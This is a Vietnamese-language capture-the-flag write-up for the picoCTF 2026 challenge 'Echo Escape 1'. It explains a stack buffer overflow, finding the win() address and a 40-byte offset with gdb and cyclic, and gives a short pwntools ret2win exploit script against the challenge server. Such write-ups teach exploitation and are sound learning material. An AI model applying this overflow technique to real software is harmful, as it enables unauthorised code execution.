# Writeup: Echo Escape 1 - picoCTF 2026

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Author:** YAHAYA MEDDY  

## 1. Mô tả Challenge

Challenge là một dịch vụ echo "secure". Khi kết nối qua netcat:

![Mô tả challenge trên picoCTF](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/6845169101721a9f385ee67203574c928e7edf34/pwn1.png)
Kết nối thực tế:

![Kết nối netcat và giao diện ban đầu](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn2.png)

Nhập thử dữ liệu xem chương trình trả ra kết quả gì

![dùng thử chương trình](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn3.png)

Có thể thấy chương trình in ra Hello + dữ liệu vừa nhập sau đó là dòng "Thank you for using our service"

## 2. Tải file binary và chuẩn bị
Sao chép địa chỉ link file binary

![Chi tiết challenge và nút copy link](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn4.png)
Tải file vuln từ server challenge:
Chúng ta sử dụng lệnh wget để tải file vuln về máy của chúng ta

![Sử dụng wget tải binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn5.png)

Cấp quyền thực thi cho binary:
Ta sử dụng lệnh "chmod +x ten_file_binary" để cho phép file binary này chạy local trên máy tính của chúng ta

![Chạy chmod +x vuln.6](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/chaylocal.png)

## 3. Phân tích Source Code

Source code được cung cấp:

![Source code vuln.c](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/sourcecodepwn.png)

**Lỗ hổng rõ ràng:**
- Buffer `char buf[32]` chỉ 32 bytes.
- Nhưng dùng `read(0, buf, 128)` → **Stack Buffer Overflow**.

Hàm `win()` sẽ mở `flag.txt` và in ra flag.

## 4. Debug với gdb + pwndbg
**Đầu tiên là và vô cùng quan trọng :** sử dụng lệnh **"file ./ten_file_binary_cua_ban" để check xem cấu hình của file binary**

![check cau hinh file](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/checkbit.png)

Tiếp theo
Mở binary trong gdb:

![Mở vuln.6 bằng gdb](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn7.png)

Xem danh sách hàm:

![Danh sách functions trong binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn8.png)

Tìm địa chỉ hàm main và win:

![Tìm địa chỉ hàm main](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn9.png)

**win() address = 0x401256**

## 5. Tìm Offset đến Return Address

Tạo cyclic pattern:

![Tạo cyclic pattern 200 bytes](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn10.png)   <!-- pwn10.png -->

Chạy binary với input dài gây crash:

![Chạy binary với cyclic pattern](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn11.png)
Sau khi chạy một chuỗi kí tự dài đã khiến cương trình bị crash
Đây chính là giá trị của Register RIP (Register Instruction Pointer) tại thời điểm chương trình crash (Segmentation Fault)
![Gía trị của Register RIP](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn12.png)
Tìm offset chính xác:
Ta sử dụng lệnh cyclic -l "giá trị RIP vừa tìm được để tìm offset

![Sử dụng cyclic -l tìm offset](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn13.png)   <!-- pwn13.png -->

**Kết quả:** Offset = **40 bytes**

## 6. Viết Exploit Script
Tiếp theo ta sử dụng thư viện pwntool của python để viết payload dùng để lấy flag
Dưới đây là nội dung file payload của bạn

```python
from pwn import *

HOST = "mysterious-sea.picoctf.net"#tên máy chủ
PORT = mã port trong challenge của bạn #port của máy chủ đó

p = remote(HOST, PORT)#kết nối với máy chủ của challenge

p.recvuntil(b"Please enter your name: ")#chạy chương trình cho đến khi gặp dòng chữ trên sau đó truyền payload ghi ở dưới

offset = 40 # đây là offset mà khi nãy ta dùng lệnh cyclic để tìm
win_addr = 0x401256 #đây là địa chỉ hàm win mà nãy ta đã tìm được

payload = b"A" * offset + p64(win_addr) #đây là nội dung payload nhớ là kiểm tra xem file binary là bao nhiêu bit nếu mà là 32 thì sửa p64 thành p32

p.sendline(payload)#gửi mã độc 
p.interactive()#nhận kết quả
```
## 7. Thực thi file payload của bạn để lấy flag
**Lưu ý!!!!: phải để địa chỉ file payload và file binary trong cùng một thư mục**
Sau đó chạy lệnh python3 "tên_file_payload.py" sau đó để file payload làm việc của nó thôi
Cuối cùng sau khi chạy thì sẽ xuất hiện flag của challenge này :

![FLAG](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/flag.png)




